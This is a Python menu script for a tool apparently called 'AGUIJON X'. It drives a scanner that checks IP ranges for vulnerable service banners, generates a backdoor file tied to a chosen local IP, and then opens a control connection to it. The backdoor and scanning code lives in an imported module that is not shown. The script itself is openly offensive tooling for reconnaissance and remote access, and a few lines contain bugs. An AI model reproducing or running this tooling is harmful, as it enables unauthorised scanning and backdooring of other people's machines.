import os, re, aguijonx	  

# Menu
os.system('color e')
print('\n\n')
print('  _________________________________________________________________')
print(' | °°°°°°°°<+>>>>>>>>>>>  AGUIJON X - v 1.0  <<<<<<<<<<<+>°°°°°°°° |')
print(' |______________________|-------------------|______________________|')


while True:
	print('\n\n <<<<<<> MENU <>>>>>>\n'
		       ' <1> Continue\n'
		       ' <2> Banner Scann\n'
		       ' <3> Generate Door\n')
	menu=input('<Choose:->> ')
	print('\n')

	if menu == '1':
		break
	elif menu == '2':
		while 1:
			"""Establecer rangos inicial y final de ips a analizar para la metodo 'traking'"""
			host_ranges = input('<Write the ip ranges>> ') 
			host_i = host_ranges.split()
			c = 0
			for h in host_i:
				print(h) #>>
				c += 1
				if c is 1:
					range_init = h
					print('rango inicial:', range_init ) #>>
				else:
					range_end = h
					print ('rango final:', range_end) #>>
			if c == 2:
				break 
			else:
				print('\n\n>>ERROR<< There must be an initial and a final range.\n')
		"""Establecer puertos a analizar para el atributo requerido de la clase 'BannerScann'  """
		select_ports= input('<Select ports: Manual 1> File 2> ')
		if select_ports == '1':
			manual_ports= input('<Write Ports>> ')
			setports = manual_ports.split()
		elif select_ports == '2':
			doc = input('<Write dir and name of file - Ports>> ')
			doc_ext = doc+'.txt'
			setports = open(doc_ext, 'r')
		else:
			pass
		"""Establecer banners vulnerables a comparar para el atributo la clase BannerScann"""
		select_vulnb= input('<Select vulnerable services: Manual 1> File 2> ')
		if select_vulnb == '1':
			manual_vulnb = input('<Write vulnerable Services>> ')
			setvulnb = select_vulnb.split()
		elif select_vulnb == '2':
			docu = input('<Write dir and name of file - Banners>> ')
			docu_ext = docu+'.txt'
			setvulnb = open(docu_ext, 'r')
		else:
			pass
		"""Utilizar los parametros obtenidos para crear objeto con BannerScann y usar la funcion traking""" 
		search_vulbann = aguijonx.BannerScann(setports, setvulnb)
		search_vulbann.traking(range_init, range_end)	 
	elif menu == '3':
		"""Crear Backdoor estableciendo local IP y ruta del archivo a crear junto con el nombre"""
		local_host = input('<Select Local IP>> ')
		wt_dir = input('Write the directory and the name of the door to create:\n<write>> ')
		create_door = aguijonx.Door()
		create_door.g_door(local_host, wt_dir) # 'localhost', r'C:\Users\Public\Desktop\Name of File'
	else:
		print('\n <!>>INCORRECT, Choose a correct option.\n')
		
input('\n<o>> Press [ENTER]')
print('\n')

play = aguijonx.Control('localhost')
play.connection() 
